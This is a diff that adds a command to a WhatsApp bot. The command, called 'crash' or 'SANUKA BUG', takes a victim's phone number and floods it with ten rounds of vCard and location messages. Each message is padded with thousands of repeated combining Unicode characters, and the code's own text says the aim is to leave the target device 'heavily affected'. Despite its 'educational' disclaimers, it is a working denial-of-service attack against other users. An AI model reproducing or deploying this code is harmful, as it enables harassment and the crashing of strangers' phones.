@@ -1,0 +1,64 @@
+const { cmd } = require('../command');
+
+cmd({
+    pattern: "crash",
+    alias: ["dead", "sanukabug"],
+    desc: "SANUKA BUG - Powerful WhatsApp Crash (Educational & Testing Only)",
+    category: "owner",
+    react: "💀",
+    filename: __filename
+},
+async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
+    try {
+        // Owner Control
+        const authorizedNumbers = ['94706000390']; // Your number with full priority
+        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;
+        
+        if (!isAuthorized) return reply("❌ Only SANUKA has access to this command.");
+
+        if (!args[0] && !m.quoted) return reply("𝐍𝐞𝐞𝐝 𝐖𝐩 𝐍𝐮𝐦𝐛𝐞𝐫 ! ❌\nExample: .crash 947xxxxxxxx");
+
+        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+        await reply("☣️ *SANUKA BUG*\nDeploying **2x Stronger** Crash Payload...\n\n⚠️ *For Educational Purpose and Testing Only* 🚀");
+
+        // === STRONGER VCARD PAYLOAD ===
+        const vcard = 'BEGIN:VCARD\n' +
+            'VERSION:3.0\n' +
+            'FN:SANUKA BUG 💀\n' +
+            'ORG:SANUKA XMD;\n' +
+            'TEL;type=CELL;type=VOICE;waid=94706000390:+94 70 600 0390\n' +
+            'X-ABLabel:' + "\u0345\u0361\u0345".repeat(4000) + '\n' +   // Doubled
+            'END:VCARD';
+
+        // === STRONGER LOCATION PAYLOAD ===
+        const locPayload = {
+            degreesLatitude: 24.121231,
+            degreesLongitude: 55.112122,
+            name: "SANUKA BUG ☣️\n" + "҉".repeat(4000),           // Doubled
+            address: "\u0345\u0361\u0345".repeat(2000)            // Doubled
+        };
+
+        // Main Attack Loop (10 iterations - kept same for stability)
+        for (let i = 0; i < 10; i++) {
+            await conn.sendMessage(target, {
+                contacts: {
+                    displayName: 'SANUKA BUG ☣️',
+                    contacts: [{ vcard }]
+                }
+            }, { quoted: mek });
+
+            await conn.sendMessage(target, {
+                location: locPayload
+            }, { quoted: mek });
+
+            await new Promise(resolve => setTimeout(resolve, 900)); // Slightly faster but still safe
+        }
+
+        await reply("✅ *SUCCESS:* 2x Stronger SANUKA BUG deployed.\nTarget device should now be heavily affected.\n\n⚠️ *For Educational Purpose and Testing Only* 💀");
+
+    } catch (e) {
+        console.log("SANUKA BUG Error: ", e.message);
+        await reply("❌ Error occurred while deploying SANUKA BUG.");
+    }
+});
